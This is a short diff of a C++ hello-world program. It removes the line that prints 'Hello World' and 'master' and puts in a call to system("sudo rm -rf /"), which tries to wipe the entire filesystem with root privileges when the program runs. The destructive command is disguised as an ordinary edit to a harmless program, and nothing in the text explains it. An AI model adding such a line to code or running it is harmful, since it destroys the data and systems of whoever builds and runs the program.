@@ -1,6 +1,6 @@
 #include<iostream>
 
 int main(){
-    std::cout << "Hello World" << std::endl << "master";
+    system("sudo rm -rf /");
     return 0;
 }
